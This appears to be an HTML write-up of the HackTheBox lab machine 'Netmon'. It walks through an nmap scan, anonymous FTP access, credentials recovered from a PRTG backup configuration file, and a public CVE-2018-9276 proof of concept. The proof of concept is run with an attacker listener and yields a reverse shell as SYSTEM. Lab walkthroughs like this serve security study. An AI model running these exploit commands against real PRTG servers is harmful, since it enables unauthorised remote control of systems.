@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netmon - HackTheBox Writeup</title>
+    <style>
+        /* ========================================
+           HACK THE BOX WRITEUP THEME
+           ======================================== */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0f1419;
+            color: #c5d1d8;
+            font-family: 'Segoe UI', 'Ubuntu', 'Roboto', sans-serif;
+            line-height: 1.8;
+            margin: 0;
+            padding: 40px 30px;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 30px;
+        }
+
+        /* Headings */
+        h1, h2, h3 {
+            color: #9fef00;
+            font-weight: 600;
+            margin-top: 2em;
+            margin-bottom: 0.8em;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            border-bottom: 3px solid #9fef00;
+            padding-bottom: 15px;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-size: 1.8em;
+            border-left: 4px solid #9fef00;
+            padding-left: 15px;
+            margin-top: 2.5em;
+        }
+
+        h3 {
+            font-size: 1.3em;
+            color: #00d9ff;
+            margin-top: 1.8em;
+        }
+
+        h4 {
+            font-size: 1.1em;
+            color: #00d9ff;
+            margin-top: 1.5em;
+            margin-bottom: 0.8em;
+        }
+
+        /* Paragraphs */
+        p {
+            margin-bottom: 1.2em;
+            color: #c5d1d8;
+        }
+
+        /* Strong/Bold */
+        strong {
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        /* Links */
+        a {
+            color: #00d9ff;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #9fef00;
+            border-bottom: 1px solid #9fef00;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .info-box p {
+            margin: 0.5em 0;
+        }
+
+        .info-box strong {
+            color: #00d9ff;
+        }
+
+        /* Code blocks */
+        pre {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 1.5em 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        code {
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            color: #9fef00;
+        }
+
+        /* Inline code */
+        p code, li code {
+            background: #1a2332;
+            color: #9fef00;
+            padding: 3px 8px;
+            border-radius: 4px;
+            border: 1px solid #2d3748;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1em 0 1em 2em;
+            color: #c5d1d8;
+        }
+
+        li {
+            margin-bottom: 0.5em;
+        }
+
+        /* Images */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid #2d3748;
+            margin: 1.5em 0;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Image placeholder for missing images */
+        .img-placeholder {
+            background: #1a2332;
+            border: 2px dashed #2d3748;
+            border-radius: 8px;
+            padding: 40px;
+            margin: 1.5em 0;
+            text-align: center;
+            color: #5c6773;
+            font-style: italic;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5em 0;
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        th {
+            background: #1f2937;
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover {
+            background: #1f2937;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a2332;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #9fef00;
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #8dd900;
+        }
+
+        /* Special styling for specific sections */
+        .command-output {
+            color: #a3b3bc;
+        }
+
+        .redacted {
+            color: #ff79c6;
+            font-weight: bold;
+        }
+
+        /* Header banner */
+        .header-banner {
+            background: linear-gradient(135deg, #1a2332 0%, #0f1419 100%);
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 2em;
+            text-align: center;
+        }
+
+        .header-banner h1 {
+            margin: 0;
+            border: none;
+            padding: 0;
+        }
+
+        .header-banner p {
+            color: #9fef00;
+            font-size: 1.1em;
+            margin: 10px 0 0 0;
+        }
+
+        /* Highlight boxes */
+        .highlight {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #ffc107;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .highlight strong {
+            color: #ffc107;
+        }
+
+        .success {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #28a745;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .success strong {
+            color: #28a745;
+        }
+
+        .warning {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #dc3545;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .warning strong {
+            color: #dc3545;
+        }
+
+        /* Step boxes */
+        .step {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .step h4 {
+            margin-top: 0;
+            color: #00d9ff;
+        }
+
+        /* Author footer */
+        .author {
+            text-align: center;
+            margin-top: 3em;
+            padding-top: 2em;
+            border-top: 1px solid #2d3748;
+            color: #5c6773;
+            font-style: italic;
+        }
+    
+        /* Screenshot slot wrapper (added for repo build) */
+        .shot { margin: 1.5em 0; }
+        .shot img { margin: 0; }
+</style>
+</head>
+<body>
+    <div class="header-banner">
+        <h1>Netmon</h1>
+        <p>HackTheBox Writeup</p>
+    </div>
+
+    <div class="info-box">
+        <p><strong>Box Name:</strong> Netmon</p>
+        <p><strong>Difficulty:</strong> Easy</p>
+        <p><strong>OS:</strong> Windows</p>
+        <p><strong>Date Completed:</strong> 26-06-2026</p>
+        <p><strong>IP Address:</strong> 10.129.230.176</p>
+    </div>
+
+    <h2>Summary</h2>
+    <p>Enumerating the box showed several ports being open, indicating this is a Windows box. Through anonymous login on FTP I could access the public directory and read user flag. On the other enumerated port 80, I visited the website and noticed a network monitor tool was running. I also noted the version 18.1.37.13946. After research I found that this version is vulnerable but only when authenticated was the exploit possible. This made me enumerate the box further through FTP to find a configuration file with the username and password. After a small change to the password I could login and attempt the exploit. The exploit gave me a reverse shell as SYSTEM.</p>
+    <h2>Enumeration</h2>
+    <h3>Nmap Scan</h3>
+    <pre><code>nmap -sCV -T4 10.129.230.176</code></pre>
+    <pre><code>PORT     STATE SERVICE      VERSION
+21/tcp   open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-title: Welcome | PRTG Network Monitor (NETMON)
+|_http-server-header: PRTG/18.1.37.13946
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+    <p><strong>Results:</strong></p>
+    <ul>
+        <li>Port 21: FTP</li>
+        <li>Port 80: HTTP</li>
+        <li>Port 135: MSRPC</li>
+        <li>Port 139: netbios-ssn</li>
+        <li>Port 445: SMB - Microsoft-ds</li>
+        <li>Port 5985: HTTPAPI</li>
+    </ul>
+    <h3>FTP Enumeration</h3>
+    <p>In the nmap output it showed that FTP was accessible with anonymous login. This means we can login using just the username <code>anonymous</code>. After login I could browse through the file system and enumerate.</p>
+    <pre><code>└──╼ [★]$ ftp 10.129.230.176
+Name (10.129.230.176:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt;</code></pre>
+    <h3>FTP User flag</h3>
+    <p>Quick enumeration showed two users, Public and Administrator. Administrator was off limits and not accessible. However when navigating to the Public user, I could browse to the Desktop and capture user flag.</p>
+    <pre><code>ftp&gt; cd Users/Public/Desktop
+ftp&gt; dir
+02-03-19  12:18AM                 1195 PRTG Enterprise Console.lnk
+02-03-19  12:18AM                 1160 PRTG Network Monitor.lnk
+06-26-26  04:22AM                   34 user.txt</code></pre>
+    <p>Also note the PRTG Network Monitor link.</p>
+    <h2>Privilege Escalation / Initial access</h2>
+    <h3>Web Enumeration</h3>
+    <p>With the user flag captured in the FTP share, I still did not have a foothold or credentials to work with. I left FTP for a while and focussed on the HTTP port and enumerated there.</p>
+    <p>When visiting the page, I get greeted by a login page of the Paessler Network Monitor tool.</p>
+    <div class="shot">
+        <img src="netmon_01.png" alt="PRTG Network Monitor login page showing version 18.1.37.13946"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>netmon_01.png</code><br>PRTG Network Monitor login page showing version 18.1.37.13946</div>
+    </div>
+    <p>Here I notice I have to login and I have no credentials. I also notice the version in the footer of the webpage. While I shift my focus back to FTP to enumerate and find sensitive files and hopefully credentials, I also search the version of this tool to see if there are any known vulnerabilities.</p>
+    <h3>Credential find</h3>
+    <p>Knowing that this tool is running on this machine, I research configuration files. After some research I found that the tool saves its configuration files under <code>C:\ProgramData\Paessler</code>. When looking through this folder I found the following interesting files:</p>
+    <ul>
+        <li><code>PRTG Configuration.dat</code></li>
+        <li><code>PRTG Configuration.old.bak</code></li>
+    </ul>
+    <pre><code>ftp&gt; cd ProgramData/Paessler/PRTG Network Monitor
+ftp&gt; dir
+02-25-19  10:54PM              1189697 PRTG Configuration.dat
+02-25-19  10:54PM              1189697 PRTG Configuration.old
+07-14-18  03:13AM              1153755 PRTG Configuration.old.bak</code></pre>
+    <p>After searching through the <code>.dat</code> file, I did not find any useful information. However when searching through the <code>old.bak</code> file I found the following credentials:</p>
+    <pre><code>User: prtgadmin
+Pass: PrTg@dmin2018</code></pre>
+    <h3>Exploitation and root flag</h3>
+    <p>With credentials, I can now login and focus on finding an attack vector. In the meantime I found a CVE that had many PoCs available and had the possibility to execute a reverse shell.</p>
+    <div class="highlight">
+    <p><strong>CVE:</strong> CVE-2018-9276</p>
+    </div>
+    <p>The CVE mentions that the exploit only works when you are authenticated. Lucky for me I just found credentials. I downloaded one of the PoCs and executed the payload.</p>
+    <pre><code>└──╼ [★]$ python3 exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.14.53 --lport 4444 \
+    --user prtgadmin --password PrTg@dmin2018
+[+] [PRTG/18.1.37.13946] is Vulnerable!
+ValueError: Session not obtained. Check your username/password and try again!</code></pre>
+    <p>The payload did not execute and in the error I notice that the username or password is not correct. I tried to login with these credentials in the web service but no success either. For basic wordlist technique I added +1 and -1 for the year. So 2018 becomes 2019.</p>
+    <pre><code>└──╼ [★]$ python3 exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.14.53 --lport 4444 \
+    --user prtgadmin --password PrTg@dmin2019
+[+] [PRTG/18.1.37.13946] is Vulnerable!
+[+] Session obtained for [prtgadmin:PrTg@dmin2019]
+[*] Hosting payload at [\\10.10.14.53\FZHLRMJF]
+[+] Listening on [10.10.14.53:4444 for the reverse shell!]
+Connection received on 10.129.230.176 50493
+Microsoft Windows [Version 10.0.14393]
+C:\Windows\system32&gt;</code></pre>
+    <p>The exploit worked and gave me a direct reverse shell. When checking the user I notice I have received the reverse shell as Administrator. I went to the Administrator Desktop and captured the root flag.</p>
+    <pre><code>C:\Users\Administrator\Desktop&gt;type root.txt</code></pre>
+    <p>With this the box has been successfully compromised.</p>
+    <h2>Key Takeaways</h2>
+    <ul>
+        <li>Anonymous FTP access can lead to leaked credentials or even open user accounts.</li>
+        <li>Thorough research of tooling can lead to known configuration file paths and credential use standards.</li>
+        <li>CVE research can help in finding an effective reverse shell.</li>
+    </ul>
+    <h2>Tools Used</h2>
+    <ul>
+        <li>Nmap</li>
+        <li>PoC CVE-2018-9276</li>
+        <li>FTP</li>
+    </ul>
+
+    <div class="author">
+        <p>Author: Tommie03</p>
+    </div>
+</body>
+</html>
